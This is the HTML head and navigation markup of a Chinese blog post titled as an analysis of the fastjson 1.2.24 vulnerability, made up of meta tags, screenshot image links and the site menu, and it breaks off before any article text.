<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="fastjson-002">
<meta property="og:type" content="article">
<meta property="og:title" content="fastjson 1.2.24漏洞分析">
<meta property="og:url" content="http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="九指 | [ninefiger&#39;s blog]">
<meta property="og:description" content="fastjson-002">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666690814437-84669d06-7c15-4dd0-87af-ef70825afafd.png#averageHue=%23e8e5e2&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=368&id=u4b8a87ed&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1072&originWidth=1838&originalType=binary&ratio=1&rotation=0&showTitle=false&size=254069&status=done&style=none&taskId=ua18bf7b1-8f69-466f-93b8-a09840fe845&title=&width=631">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666692623030-e2458c0f-8d76-4599-bdc1-4bf5703a189e.png#averageHue=%23f5f0ec&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=172&id=qeIeq&margin=%5Bobject%20Object%5D&name=image.png&originHeight=382&originWidth=1540&originalType=binary&ratio=1&rotation=0&showTitle=false&size=106228&status=done&style=none&taskId=u4a3565cb-4a4c-4abc-9795-d87726c011c&title=&width=692">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666693058473-a80b1426-fa22-4059-85b7-3a5740ee442d.png#averageHue=%23f7f6f4&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=508&id=ub940bae6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1538&originWidth=2046&originalType=binary&ratio=1&rotation=0&showTitle=false&size=434071&status=done&style=none&taskId=u99ec2222-8205-4d95-a446-4df0e4e4a1f&title=&width=676">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666747762762-b1b03c96-dc7c-4c03-a18f-be7b8dd2d871.png#averageHue=%23f6f4f1&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=472&id=u3848ae80&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1504&originWidth=1990&originalType=binary&ratio=1&rotation=0&showTitle=false&size=410878&status=done&style=none&taskId=uc92e1f69-5cb9-4392-9822-85ef84f9053&title=&width=625">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666748204892-915289b5-b995-4698-b19a-09dc152ce245.png#clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=244&id=ufdded8a1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=694&originWidth=1884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=171920&status=done&style=none&taskId=ucc98d2bc-a599-4249-a785-f0917618cd2&title=&width=662">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666748276936-1352d674-0248-40bd-a14e-c6f1ec2cbeb1.png#clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=518&id=ud070774d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1380&originWidth=1800&originalType=binary&ratio=1&rotation=0&showTitle=false&size=269788&status=done&style=none&taskId=ue8ad5a3d-44db-4f98-90a0-a1add378e5f&title=&width=676">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666748335300-3037b79a-409d-42be-ad92-eb71d7200940.png#clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=567&id=u9665bff3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1442&originWidth=1752&originalType=binary&ratio=1&rotation=0&showTitle=false&size=248737&status=done&style=none&taskId=ue3d244c0-6233-48b0-acb6-723e5336cf1&title=&width=689">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666748593490-4dd25a55-88ed-474f-9a34-0ff49b47db11.png#clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=874&id=uc9be80ed&margin=%5Bobject%20Object%5D&name=image.png&originHeight=2154&originWidth=1670&originalType=binary&ratio=1&rotation=0&showTitle=false&size=322005&status=done&style=none&taskId=ua2e3b849-110b-47fd-9193-687856daf98&title=&width=678">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666750600101-7779306b-e157-4fd6-8cdd-ed1bd323ec4f.png#averageHue=%23fbf9f8&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=338&id=u43c7ed76&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1034&originWidth=2108&originalType=binary&ratio=1&rotation=0&showTitle=false&size=195649&status=done&style=none&taskId=u185e34cc-e07e-4296-bb1b-a01df7f9ea8&title=&width=689">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666750723449-dd10de0d-0778-4b85-93f9-a8d627e5c3c6.png#averageHue=%23f8f4f3&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=552&id=u002841f6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1104&originWidth=1680&originalType=binary&ratio=1&rotation=0&showTitle=false&size=273276&status=done&style=none&taskId=u783b844b-1a48-4be6-9f09-49705a614df&title=&width=840">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752167049-7b8c7f78-f98d-40dd-96e9-45e54dc3adb7.png#averageHue=%23f9f5f3&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=373&id=u70cd5a59&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1050&originWidth=1316&originalType=binary&ratio=1&rotation=0&showTitle=false&size=167125&status=done&style=none&taskId=u598ebc93-c3cc-4ac2-8c31-644fe3778a8&title=&width=467">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752197691-02b90c9d-2f0a-4794-9739-4ff1e3242bef.png#averageHue=%23eae9d0&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=255&id=u482a3866&margin=%5Bobject%20Object%5D&name=image.png&originHeight=510&originWidth=914&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75038&status=done&style=none&taskId=u1f516c5f-9544-48b2-a535-cfb00e9a863&title=&width=457">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752211795-651dc0a8-e875-4f2f-985c-eee808b3e705.png#averageHue=%23e8e0c6&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=255&id=ud2457aae&margin=%5Bobject%20Object%5D&name=image.png&originHeight=608&originWidth=2066&originalType=binary&ratio=1&rotation=0&showTitle=false&size=177182&status=done&style=none&taskId=ue9afae23-3381-42ec-ab45-a080a91e84c&title=&width=865">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752227138-347d8a5f-227b-4de6-825b-441ab7136101.png#averageHue=%23eaddc3&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=312&id=u2811f769&margin=%5Bobject%20Object%5D&name=image.png&originHeight=624&originWidth=1334&originalType=binary&ratio=1&rotation=0&showTitle=false&size=147910&status=done&style=none&taskId=u67e2cb60-64be-4a85-92a4-fcdfbd1333b&title=&width=667">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752368256-74bbd007-71a7-4f5b-8c28-a3e74bff5be9.png#averageHue=%23fafaf8&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=423&id=u4b38f00e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1096&originWidth=1774&originalType=binary&ratio=1&rotation=0&showTitle=false&size=181077&status=done&style=none&taskId=u46a2c035-ac1a-4b41-ada8-d4bddbd638d&title=&width=684">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752769247-1bc88dac-013e-4488-a091-28d84254f9e1.png#averageHue=%23f8f0ee&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=471&id=uc2ef2003&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1072&originWidth=1362&originalType=binary&ratio=1&rotation=0&showTitle=false&size=236263&status=done&style=none&taskId=u325a6b67-d80b-4435-bfb4-380a3e8ce2a&title=&width=598">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666769390586-628e5e5f-82f7-49b7-b403-0ee40108e2f4.png#averageHue=%23f6f6f5&clientId=u91088b5a-7e13-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=467&id=u1fef1989&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1566&originWidth=2312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=451166&status=done&style=none&taskId=u7ebb3d14-149e-47e3-9c4e-57d764ecffa&title=&width=689">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666773548750-2d8ad966-6b26-4287-b8e4-59ce83b89d77.png#averageHue=%23f4f3ef&clientId=u769790c2-fea5-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=390&id=ub45859b9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1240&originWidth=2104&originalType=binary&ratio=1&rotation=0&showTitle=false&size=461319&status=done&style=none&taskId=u3f74f68d-4c3c-4095-b6df-909c9aa9b14&title=&width=662">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666773590685-71aed2ab-46fa-4ef4-80b5-380bbf76531d.png#averageHue=%23f6f6f1&clientId=u769790c2-fea5-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=515&id=u81951b27&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1420&originWidth=2562&originalType=binary&ratio=1&rotation=0&showTitle=false&size=538804&status=done&style=none&taskId=u99ac6d72-cf24-4925-b2bd-8af8ca986b1&title=&width=929">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666773618134-41ae335b-7d7c-467c-9b63-23896e5d0682.png#averageHue=%23f6f5f0&clientId=u769790c2-fea5-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=470&id=ua9892fb2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1510&originWidth=2654&originalType=binary&ratio=1&rotation=0&showTitle=false&size=584282&status=done&style=none&taskId=ue3978a40-270d-424b-be92-a9393c513b3&title=&width=826">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666774215340-3656768c-dd50-43cb-904d-bba9fd92a99f.png#averageHue=%23fbfbfb&clientId=u769790c2-fea5-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=379&id=uc17e5a91&margin=%5Bobject%20Object%5D&name=image.png&originHeight=758&originWidth=1900&originalType=binary&ratio=1&rotation=0&showTitle=false&size=218781&status=done&style=none&taskId=ue4e6c165-9675-4794-ae63-b9f63abc01f&title=&width=950">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666841736175-aa39e69a-01db-41c1-9e62-6e9dde7459be.png#averageHue=%23faf8f6&clientId=ua4aa9c72-4c8e-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=688&id=ucae1556a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1376&originWidth=2668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=504041&status=done&style=none&taskId=ufa387ade-d668-44b4-9ce5-4c77e2627cc&title=&width=1334">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666841994159-4ce07368-b6ca-42e0-81bd-3550765ec97e.png#averageHue=%23f6f6f6&clientId=ua4aa9c72-4c8e-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=112&id=ub0b1a474&margin=%5Bobject%20Object%5D&name=image.png&originHeight=224&originWidth=1184&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29653&status=done&style=none&taskId=u154703f9-f853-4580-88e1-3f8245eba27&title=&width=592">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666841241851-d5119dbf-e993-4fc8-8eb6-360b57abb017.png#averageHue=%23f9f8f7&clientId=ua4aa9c72-4c8e-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=535&id=u1f36685a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1234&originWidth=1818&originalType=binary&ratio=1&rotation=0&showTitle=false&size=421192&status=done&style=none&taskId=u09f1f10c-599c-4876-a3a8-d0b36ca8549&title=&width=788">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666853819155-01c0a031-3ef4-46c3-a554-2ad331ca8d2d.png#averageHue=%23faf4f2&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=347&id=uf36294e7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=694&originWidth=1048&originalType=binary&ratio=1&rotation=0&showTitle=false&size=130437&status=done&style=none&taskId=u6e3e0351-7aa1-4887-9b19-3fe29a56674&title=&width=524">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666853961244-1626e359-9971-4851-afdb-bf8e14434b4f.png#averageHue=%23faf3f2&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=464&id=u02946279&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1312&originWidth=1740&originalType=binary&ratio=1&rotation=0&showTitle=false&size=307612&status=done&style=none&taskId=u528fa4d8-8ca9-4b77-95d3-e6c43622a94&title=&width=615">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666854100074-bbf49612-90e7-4bb8-8fc8-183a228554f6.png#averageHue=%23f9f6f6&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=572&id=ue761ce8c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1694&originWidth=1784&originalType=binary&ratio=1&rotation=0&showTitle=false&size=396075&status=done&style=none&taskId=u25591307-34c2-4a30-befa-bb0d1f65102&title=&width=602">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666854171555-22e7e6c4-0cd9-43fa-a80f-50045df3a2ac.png#averageHue=%23f8f1ef&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=396&id=ufe73af81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=960&originWidth=1892&originalType=binary&ratio=1&rotation=0&showTitle=false&size=290178&status=done&style=none&taskId=u6bf428ea-fa0e-4ee9-9dea-80ca766ddf6&title=&width=780">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666854367136-39c97a7a-fe2d-4360-93ca-29d15070c46c.png#averageHue=%23f9f6f6&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=641&id=u7ae14e7e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1564&originWidth=1958&originalType=binary&ratio=1&rotation=0&showTitle=false&size=401017&status=done&style=none&taskId=ubba81e46-fd38-47de-8f1a-7f7c37e2d9d&title=&width=803">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666854586165-0deed445-c45b-4617-bea4-9b265bc07bb0.png#averageHue=%23f9f7f5&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=694&id=u3aaa7648&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1714&originWidth=2108&originalType=binary&ratio=1&rotation=0&showTitle=false&size=440507&status=done&style=none&taskId=u17be552e-033f-4372-9b93-6601b6399fd&title=&width=853">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666854849360-d8369378-570f-4b10-8276-a1e78c15c527.png#averageHue=%23f8f7f6&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=517&id=u648c416d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1468&originWidth=1884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=332485&status=done&style=none&taskId=u53cff068-d2f2-41f5-beed-43fc180c84f&title=&width=663">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855161299-b3e77726-4d6d-40a7-825e-7b174a1e8dd6.png#averageHue=%23f6f3ef&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=556&id=u694bac0c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1534&originWidth=2192&originalType=binary&ratio=1&rotation=0&showTitle=false&size=538307&status=done&style=none&taskId=ua60edc8d-5267-4ea0-8268-9121e083d8f&title=&width=794">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855069428-90cd50f0-2d3a-4ab0-9938-74c66488daea.png#averageHue=%23f6f4f0&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=508&id=u11fc71e6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1476&originWidth=2298&originalType=binary&ratio=1&rotation=0&showTitle=false&size=610625&status=done&style=none&taskId=u7b7ae460-7325-45f5-bb61-f04db6b7d8e&title=&width=791">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855326621-1e1d218a-92fa-47d6-931d-da823e8e18e4.png#averageHue=%23f7f3f1&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=723&id=u6a9a9165&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1676&originWidth=1832&originalType=binary&ratio=1&rotation=0&showTitle=false&size=420418&status=done&style=none&taskId=u06d1b52b-11ec-4e19-b5f9-c84782f220a&title=&width=790">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855544092-b277870e-aa13-4ba7-816b-f15e46d357eb.png#averageHue=%23f8f5f3&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=608&id=uea4ec959&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1590&originWidth=2084&originalType=binary&ratio=1&rotation=0&showTitle=false&size=377080&status=done&style=none&taskId=u38dcacc8-318a-4674-9f16-1ec9a769ac9&title=&width=797">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855721086-9c71be9d-2bba-4b7f-958c-cd4a78674ef4.png#averageHue=%23f9f6f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=683&id=u014315ea&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1656&originWidth=2024&originalType=binary&ratio=1&rotation=0&showTitle=false&size=405009&status=done&style=none&taskId=u7ec0957a-9055-4e77-81da-dc046fc9ea6&title=&width=835">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855798118-aa6455ae-10be-4f5a-a190-09d058614c74.png#averageHue=%23f8f8f5&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=524&id=ubf9d60c5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1432&originWidth=2306&originalType=binary&ratio=1&rotation=0&showTitle=false&size=387665&status=done&style=none&taskId=u723ced45-e1a5-410f-885a-86e1cdbcde3&title=&width=844">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855834125-e3fdd337-faf2-4393-9bd4-f63ad91e3590.png#averageHue=%23f8f7f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=498&id=uc49448da&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1268&originWidth=2278&originalType=binary&ratio=1&rotation=0&showTitle=false&size=329805&status=done&style=none&taskId=ua9ce33ad-af30-4a4f-bda3-5e075b35e1d&title=&width=894">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666857860802-07c08ecb-16fa-4469-9fcc-985307b5e64b.png#averageHue=%23f8f8f7&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=852&id=uebd73a9b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=2184&originWidth=2060&originalType=binary&ratio=1&rotation=0&showTitle=false&size=715195&status=done&style=none&taskId=u64fb8721-fcad-43e7-a619-5c475ca5f4b&title=&width=804">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666948632780-ddaa2378-7f04-49ff-8f83-f6ee415d97da.png#averageHue=%23f8f5f4&clientId=u6d26b6aa-6b88-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=583&id=u58fd35d3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1604&originWidth=2496&originalType=binary&ratio=1&rotation=0&showTitle=false&size=447246&status=done&style=none&taskId=u7ae6d8b2-283b-4268-96e9-8b7ed7972a1&title=&width=907">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666858440910-5d09e9c8-abf9-412d-8083-988a101d943f.png#averageHue=%23f7f7f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=712&id=u7a67c9ec&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1666&originWidth=2010&originalType=binary&ratio=1&rotation=0&showTitle=false&size=528895&status=done&style=none&taskId=ufae3a256-b8ac-4f5a-9b22-69a2590f916&title=&width=859">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666858777493-0914c5a0-a3e8-4aee-865c-a0b4035c828b.png#averageHue=%23f9f8f7&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=1377&id=u16068f40&margin=%5Bobject%20Object%5D&name=image.png&originHeight=3350&originWidth=2292&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1061777&status=done&style=none&taskId=ue8c4e6f5-b407-4916-affa-04d87473e0b&title=&width=942">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666859226689-5c2a909a-8503-4585-9e92-9f56efd0a50a.png#averageHue=%23f7f6f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=1402&id=ud0349218&margin=%5Bobject%20Object%5D&name=image.png&originHeight=3796&originWidth=2180&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1672071&status=done&style=none&taskId=ub2cb3daf-2c5f-4574-b991-f4d34811cf4&title=&width=805">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666859330378-13c1234d-bb99-4e5e-b6fe-4be4031e6a2b.png#averageHue=%23f9f3f2&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=391&id=u62f8b730&margin=%5Bobject%20Object%5D&name=image.png&originHeight=998&originWidth=2022&originalType=binary&ratio=1&rotation=0&showTitle=false&size=240448&status=done&style=none&taskId=u19067f1a-a80e-4d9d-af81-310e5240f26&title=&width=792">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666860260058-5c4239a4-dab4-42a0-8d65-d76ad6b55569.png#averageHue=%23f7f6f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=571&id=u7287cd99&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1566&originWidth=1814&originalType=binary&ratio=1&rotation=0&showTitle=false&size=410130&status=done&style=none&taskId=u749495a5-39b2-44f7-b22c-60353a4a05c&title=&width=662">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666860518018-668d46c3-1138-4f29-8af1-716dda405b42.png#averageHue=%23f6f6f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=1083&id=u40317ccb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=2948&originWidth=1758&originalType=binary&ratio=1&rotation=0&showTitle=false&size=859645&status=done&style=none&taskId=u11da7593-9762-434b-81c1-b7149920449&title=&width=646">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666861809768-51988120-e348-4d11-8e57-91d3df6e74f8.png#averageHue=%23fbf9f8&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=571&id=ub8e5b026&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1574&originWidth=1550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=342701&status=done&style=none&taskId=uf319ddac-3fe0-4ca3-b856-6858d35c1fe&title=&width=562">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666862170074-f23c5bad-6348-46a9-b981-71490ef8dc7e.png#averageHue=%23f9f9f9&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=401&id=u392f4915&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1184&originWidth=1258&originalType=binary&ratio=1&rotation=0&showTitle=false&size=172793&status=done&style=none&taskId=u0e7da16f-019c-4911-b922-4d5686a17ea&title=&width=426">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666863899326-e3799c34-1997-46f7-9834-bea5084c3f5e.png#averageHue=%23ecebe9&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=612&id=uf523758f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1224&originWidth=2774&originalType=binary&ratio=1&rotation=0&showTitle=false&size=803603&status=done&style=none&taskId=uacafbb70-2621-4372-8641-476818b1d19&title=&width=1387">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666865887150-1c172434-43c4-4dfd-90d8-d7fe1cedb96b.png#averageHue=%23f5f5f5&clientId=u95dfbd9d-d538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=416&id=u12ae7457&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1168&originWidth=2716&originalType=binary&ratio=1&rotation=0&showTitle=false&size=604694&status=done&style=none&taskId=u045de62d-97f6-4f55-a27e-41c4fc9930c&title=&width=968">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666882706442-4eb44d94-e709-4558-8e10-f923f8b16e71.png#averageHue=%23f7f4ee&clientId=u13878d85-faf4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=390&id=uc2319c10&margin=%5Bobject%20Object%5D&name=image.png&originHeight=924&originWidth=2358&originalType=binary&ratio=1&rotation=0&showTitle=false&size=252333&status=done&style=none&taskId=uc00169fd-0d02-40d2-9248-6a9010e6f23&title=&width=996">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666882878566-cc3bd17a-c6a2-4454-8c17-51837fc0986a.png#averageHue=%23f7f5ee&clientId=u13878d85-faf4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=337&id=u36fa8156&margin=%5Bobject%20Object%5D&name=image.png&originHeight=674&originWidth=1432&originalType=binary&ratio=1&rotation=0&showTitle=false&size=133052&status=done&style=none&taskId=ud0ac60d4-911a-4309-817f-d72274c4d0a&title=&width=716">
<meta property="article:published_time" content="2022-11-11T06:01:00.000Z">
<meta property="article:modified_time" content="2022-11-11T06:56:12.097Z">
<meta property="article:author" content="ninefiger">
<meta property="article:tag" content="漏洞分析">
<meta property="article:tag" content="fastjson">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666690814437-84669d06-7c15-4dd0-87af-ef70825afafd.png#averageHue=%23e8e5e2&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=368&id=u4b8a87ed&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1072&originWidth=1838&originalType=binary&ratio=1&rotation=0&showTitle=false&size=254069&status=done&style=none&taskId=ua18bf7b1-8f69-466f-93b8-a09840fe845&title=&width=631">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
        
      
    
    <!-- title -->
    <title>fastjson 1.2.24漏洞分析</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="九指 | [ninefiger&#39;s blog]" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/link">链接</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
